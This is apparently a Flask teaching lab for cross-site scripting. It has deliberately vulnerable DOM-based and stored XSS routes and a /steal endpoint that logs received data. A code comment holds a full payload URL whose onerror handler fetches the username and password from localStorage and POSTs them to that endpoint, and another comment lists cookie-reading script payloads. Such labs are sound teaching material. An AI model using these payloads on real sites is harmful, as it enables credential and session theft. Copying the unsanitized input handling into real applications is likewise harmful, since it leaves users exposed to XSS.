from flask import Flask, render_template, request

app = Flask(__name__)
stored_data_list = []


@app.route("/", methods=["POST", "GET"])
def index():
    item = request.args.get("item", "default")

    if item == "default":
        return "hola"
    if request.method == "GET":
        return item


# http://127.0.0.1:5000/dom#2%22%20onerror=%22fetch('http://127.0.0.1:5000/steal',{method:'POST',headers:%20{'Accept':%20'application/json','Content-Type':%20'application/json'},body:JSON.stringify({username:localStorage.getItem('username'),password:localStorage.getItem('password')})}).then(e=%3Ee.json()).then(data=%3Ewindow.alert(JSON.stringify(data)))%22%3E
@app.route("/steal", methods=["POST"])
def steal():
    content = request.json
    if content:
        if request.method == "POST":
            print("Info Stolen!")
            print(content)

            return {"message": "info stolen"}


@app.route("/dom")
def dom():
    """
    exploit: dom based xss
        key factor:
            - look for website using fragments
            - look if the fragments are used to render imgs/tags dynamically
        scenario:
            hacker takes advantage of social media site using fragments to
            dynamically render the correct imgs on screen

            hacker modifies fragment part of url to escape and write custom execution
             - ex: steal user info
    """
    return render_template("dom.html")


# Route with a stored XSS vulnerability: HTML: <h1>Hello World</h1> Javascript: <script>alert("Hello world.\n");</script> Javascript: <script.alert(document.cookie);</script>
@app.route("/stored", methods=["GET", "POST"])
def store_xss():
    if request.method == "POST":
        user_input = request.form.get("user_input", "")
        # In a real application, you would sanitize and validate user input before storing or displaying it to prevent XSS attacks.

        # For this purposes, we will simply store the input and display it.
        stored_data = f"User input: {user_input}"
        stored_data_list.append(stored_data)

        return render_template("stored.html", stored_data_list=stored_data_list)
    else:
        return render_template("stored.html", stored_data_list=stored_data_list)


if __name__ == "__main__":
    app.run(debug=True)
